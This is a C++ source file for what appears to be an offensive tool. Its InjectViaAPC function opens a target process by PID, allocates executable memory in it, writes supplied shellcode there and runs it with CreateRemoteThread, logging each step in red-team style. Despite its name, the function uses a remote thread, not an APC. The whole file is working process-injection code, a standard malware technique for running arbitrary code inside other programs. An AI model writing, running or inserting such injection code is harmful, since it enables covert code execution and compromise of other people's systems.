#include "process_injection.hpp"
#include <iostream>
#include <tlhelp32.h>

ProcessInjection::~ProcessInjection() {
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessInjection::InjectViaAPC(DWORD pid, const std::vector<BYTE>& shellcode) {
    if (verbose) std::cout << "[*] Opening existing process PID " << pid << "...\n";
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;
    if (verbose) std::cout << "[+] Process opened: 0x" << std::hex << (uintptr_t)hProcess << std::dec << "\n";

    if (verbose) std::cout << "[*] Allocating memory (" << shellcode.size() << " bytes)...\n";
    LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, shellcode.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodeAddr) {
        CloseHandle(hProcess); return false;
    }
    if (verbose) std::cout << "[+] Memory allocated at: 0x" << std::hex << (uintptr_t)shellcodeAddr << std::dec << "\n";

    if (verbose) std::cout << "[*] Writing shellcode...\n";
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, shellcodeAddr, shellcode.data(),
        shellcode.size(), &bytesWritten) || bytesWritten != shellcode.size()) {
        VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess); return false;
    }
    if (verbose) std::cout << "[+] Shellcode written: " << bytesWritten << " bytes\n";

    if (verbose) std::cout << "[*] Creating remote thread...\n";
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        LPTHREAD_START_ROUTINE(shellcodeAddr), NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess); return false;
    }
    if (verbose) std::cout << "[+] Remote thread created: 0x" << std::hex << (uintptr_t)hThread << std::dec << "\n";

    if (verbose) std::cout << "[*] Cleaning up...\n";
    CloseHandle(hThread);
    CloseHandle(hProcess);
    if (verbose) std::cout << "[+] Cleanup complete\n";
    return true;
}